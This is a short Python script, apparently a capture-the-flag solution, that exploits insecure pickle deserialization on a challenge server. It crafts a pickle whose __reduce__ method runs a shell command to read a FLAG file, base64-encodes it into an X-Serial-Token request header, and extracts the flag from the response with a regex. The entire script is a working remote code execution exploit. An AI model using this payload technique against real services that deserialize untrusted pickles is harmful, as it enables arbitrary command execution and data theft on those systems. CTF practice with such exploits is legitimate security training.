#!/usr/bin/env python3
import pickle
import base64
import requests
import re

class test:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['/bin/cat', 'FLAG'],))

p = pickle.dumps(test())
header = base64.b64encode(p).decode('ASCII')

url = 'http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7'

response = requests.get(url, headers={'X-Serial-Token': header})

flag = re.findall(r'E4HX{.*}', response.text)[0]
print(flag)
